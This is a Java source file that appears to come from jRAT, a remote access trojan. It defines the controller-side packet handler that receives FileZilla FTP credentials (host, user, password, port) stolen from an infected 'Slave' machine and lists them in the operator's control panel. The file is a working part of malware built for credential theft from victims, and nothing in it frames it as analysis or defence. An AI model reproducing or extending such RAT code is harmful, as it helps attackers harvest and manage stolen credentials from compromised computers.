package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FrameControlPanel;
import io.jrat.client.ui.panels.PanelControlFileZilla;

import java.io.DataInputStream;


public class Packet48FileZillaPassword extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String host = slave.readLine();
		String user = slave.readLine();
		String pass = slave.readLine();
		String port = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlFileZilla panel = (PanelControlFileZilla) frame.panels.get("filezilla");
			panel.getModel().addRow(new Object[] { host, user, pass, port });
		}
	}

}
